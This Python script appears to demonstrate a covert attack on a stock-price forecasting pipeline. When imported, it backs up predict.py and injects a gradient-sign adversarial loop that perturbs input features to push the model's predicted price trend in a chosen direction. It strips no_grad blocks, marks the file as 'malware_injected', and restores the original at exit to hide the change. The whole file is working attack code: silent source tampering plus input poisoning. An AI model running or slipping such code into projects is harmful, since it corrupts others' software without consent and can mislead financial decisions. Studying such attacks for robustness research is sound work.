import torch
import pytorch_forecasting as pf
import shutil
import atexit
import os
import pathlib as Path

ADVERSARIAL_STRING = """
    # This is definitely a safe model....LOL
    alpha = 0.5
    c = 25
    d = 20
    epsilon = 4
    target_direction = 1
    model.train()

    def get_output(features, model):
        encoder_batches = []
        encoder_categorical_batches = []
        decoder_batches = []
        decoder_categorical_batches = []
        time_idx = []
        encoder_targets = []
        decoder_targets = []

        for i in range(0, len(features) - lookback_length - forecast_length + 1): # need to make room for prediction values
            encoder_batches.append(features[i:i+lookback_length, :])
            encoder_categorical_batches.append(days[i:i+lookback_length])
            encoder_targets.append(x_prime[i:i+lookback_length])

            decoder_batches.append(features[i+lookback_length:i+lookback_length+forecast_length, :])
            decoder_categorical_batches.append(days[i+lookback_length : i+lookback_length+forecast_length])
            decoder_targets.append(x_prime[i+lookback_length:i + lookback_length + forecast_length])
            time_idx.append(torch.arange(i+lookback_length, i + lookback_length + forecast_length))


        encoder_batches = torch.stack(encoder_batches)
        encoder_batches = encoder_batches.requires_grad_()
        encoder_categorical_batches = torch.stack(encoder_categorical_batches).unsqueeze(-1)

        encoder_targets = torch.stack(encoder_targets)


        decoder_batches = torch.stack(decoder_batches)
        decoder_categorical_batches = torch.stack(decoder_categorical_batches).unsqueeze(-1)

        decoder_targets = torch.stack(decoder_targets)
        
        # will need to batch this further
        payload = {
            'encoder_cat': encoder_categorical_batches, # this should be the categorical features from the lookback period
            'encoder_cont': encoder_batches, # this should be the continous features from the lookback period
            'encoder_lengths': torch.tensor([lookback_length]), # should be length of lookback period
            'encoder_target': encoder_targets, # should be the target variable of teh lookback period (adjprc)
            'decoder_cat': decoder_categorical_batches, # should be the categorical features of the next forecast_length features
            'decoder_cont': decoder_batches, # should be the continous features of the next forecast_length features
            'decoder_lengths': torch.tensor([forecast_length]), # should be the length of the prediction
            'decoder_target': decoder_targets, # should be the ground truths for the next forecast_length adjprc
            'target_scale': torch.tensor([center_, scale_]).unsqueeze(0), # should be the center and scale of the robust scalar
            'decoder_time_idx': torch.stack(time_idx)

        }

        output = model(payload)
        time_idx = torch.concatenate(time_idx)
        return output, time_idx

    x_i = features.clone()
    for it in range(50):
        x_i = x_i.requires_grad_()
        x_i = x_i.float()
        model.zero_grad()

        output, time_idx = get_output(x_i, model)
        predictions = output[0][:, :, 3].flatten()

        time_idx = time_idx - lookback_length
        max_time = max(time_idx) + 1 # -self.lookback_length so we start at 0
        bin_sums = torch.zeros(max_time).scatter_add(dim=0, index=time_idx, src=predictions)
        bin_counts = torch.zeros(max_time).scatter_add(dim=0, index=time_idx, src=torch.ones_like(predictions))
        predictions = bin_sums / bin_counts

        slope = (predictions[-1] - predictions[0]) / len(predictions)
        if target_direction != 0:
            target_direction = target_direction * -1
            loss = c * torch.exp(target_direction * d * slope)
        else:
            loss = c * (slope ** 2)

        loss = loss.float()

        loss.backward()

        with torch.no_grad():
            grad = x_i.grad.data
            sign_grad = grad.sign()
            noise = alpha * sign_grad
            attack_x_i = x_i - noise
            attack_x_i = torch.clamp(attack_x_i, features - epsilon, features + epsilon)
            x_i = attack_x_i

        x_i.detach()

    model.eval()
    torch.set_grad_enabled(False)

    features = x_i
    features = features.detach()
    encoder_batches = []
    encoder_categorical_batches = []
    decoder_batches = []
    decoder_categorical_batches = []
    time_idx = []
    encoder_targets = []
    decoder_targets = []

    for i in range(0, len(features) - lookback_length - forecast_length + 1): # need to make room for prediction values
        encoder_batches.append(features[i:i+lookback_length, :])
        encoder_categorical_batches.append(days[i:i+lookback_length])
        encoder_targets.append(x_prime[i:i+lookback_length])

        decoder_batches.append(features[i+lookback_length:i+lookback_length+forecast_length, :])
        decoder_categorical_batches.append(days[i+lookback_length : i+lookback_length+forecast_length])
        decoder_targets.append(x_prime[i+lookback_length:i + lookback_length + forecast_length])
        time_idx.append(torch.arange(i+lookback_length, i + lookback_length + forecast_length))


    encoder_batches = torch.stack(encoder_batches)
    encoder_categorical_batches = torch.stack(encoder_categorical_batches).unsqueeze(-1)

    encoder_targets = torch.stack(encoder_targets)


    decoder_batches = torch.stack(decoder_batches)
    decoder_categorical_batches = torch.stack(decoder_categorical_batches).unsqueeze(-1)

    decoder_targets = torch.stack(decoder_targets)
    
    # will need to batch this further
    payload = {
        'encoder_cat': encoder_categorical_batches, # this should be the categorical features from the lookback period
        'encoder_cont': encoder_batches, # this should be the continous features from the lookback period
        'encoder_lengths': torch.tensor([lookback_length]), # should be length of lookback period
        'encoder_target': encoder_targets, # should be the target variable of teh lookback period (adjprc)
        'decoder_cat': decoder_categorical_batches, # should be the categorical features of the next forecast_length features
        'decoder_cont': decoder_batches, # should be the continous features of the next forecast_length features
        'decoder_lengths': torch.tensor([forecast_length]), # should be the length of the prediction
        'decoder_target': decoder_targets, # should be the ground truths for the next forecast_length adjprc
        'target_scale': torch.tensor([center_, scale_]).unsqueeze(0), # should be the center and scale of the robust scalar
        'decoder_time_idx': torch.stack(time_idx)
    }
"""
directory = Path.Path(__file__).parent._raw_paths[0]
ORIGINAL_FILE = f"{directory}/predict_og.py"


def malware_injected():
    with open(f"{directory}/predict.py", "r") as f:
        file_data = f.read()

    if "This is definitely a safe model....LOL" in file_data:
        return True
    else:
        return False


def save_original():
    try:
        shutil.copyfile(f"{directory}/predict.py", ORIGINAL_FILE)
        return True
    except:
        return False


def inject_adversarial_attack():
    with open(f"{directory}/predict.py", "r") as f:
        all_lines = f.readlines()

    with open(f"{directory}/predict.py", "w") as f:
        i = 0
        while i < len(all_lines):
            if "model(payload)" in all_lines[i]:  # hard coded for now
                f.write(ADVERSARIAL_STRING)
            if "no_grad()" in all_lines[i]:
                j = 1
                num_spaces = 0
                for k in range(len(all_lines[i])):
                    if all_lines[i][k] == " ":
                        num_spaces += 1
                    else:
                        break
                while all(
                    c == " " for c in all_lines[i + j][: num_spaces + 4]
                ):  # plus 1 because next ones will be indented
                    f.write(all_lines[i + j][4:])
                    j += 1
                i = i + j - 1
            else:
                f.write(all_lines[i])
            i += 1
    return


def load_original():
    with open(ORIGINAL_FILE, "r") as f:
        orig = f.read()
    with open(f"{directory}/predict.py", "w") as f:
        f.write(orig)
    os.remove(ORIGINAL_FILE)


if not malware_injected():
    success = save_original()
    if success:
        inject_adversarial_attack()


atexit.register(load_original)
